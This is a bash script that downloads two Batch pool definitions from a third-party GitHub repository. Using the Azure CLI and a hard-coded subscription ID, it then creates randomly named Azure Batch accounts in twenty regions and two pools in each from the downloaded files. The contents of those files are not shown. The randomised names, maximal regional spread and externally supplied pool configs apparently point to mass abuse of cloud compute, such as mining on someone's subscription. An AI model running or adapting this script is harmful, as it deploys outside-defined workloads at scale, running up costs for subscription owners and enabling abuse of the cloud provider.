#!/bin/bash
sub="b0f86cd1-dc5e-49c0-845f-4f3a3f48c71b"
ran=`head /dev/urandom | tr -dc a-z0-9 | fold -w 3 | head -n 1`
wget -O batch.json https://raw.githubusercontent.com/winttr89/batch5/main/batch.json
wget -O batch2.json https://raw.githubusercontent.com/winttr89/batch5/main/batch2.json
az provider register --namespace Microsoft.Batch --subscription "$sub"
az group create --name batchacc$ran --location westus2 --subscription "$sub"
echo "sleep 15s..."
sleep 15s
nnn=`head /dev/urandom | tr -dc a-z0-9 | fold -w 14 | head -n 1`
batch=0
for region in australiaeast canadacentral centralindia centralus eastus eastus2 francecentral germanywestcentral japaneast koreacentral northeurope southcentralus southeastasia switzerlandnorth uksouth westcentralus westeurope westus westus2 westus3
do
	echo "Batch account creating...$region"
	batch=$(( $batch + 1 ))
	az batch account create --subscription "$sub" --name a$batch$nnn --resource-group batchacc$ran --location $region --no-wait
done
echo "sleep 12m..."
sleep 12m
batch=0
echo "Batch account setting..."
for region in australiaeast canadacentral centralindia centralus eastus eastus2 francecentral germanywestcentral japaneast koreacentral northeurope southcentralus southeastasia switzerlandnorth uksouth westcentralus westeurope westus westus2 westus3
do
	batch=$(( $batch + 1 ))
	az batch account login --subscription "$sub" --name a$batch$nnn --resource-group batchacc$ran --shared-key-auth
	az batch pool create --subscription "$sub" --account-name a$batch$nnn --json-file ./batch.json
	az batch pool create --subscription "$sub" --account-name a$batch$nnn --json-file ./batch2.json
done
echo "Xong..."
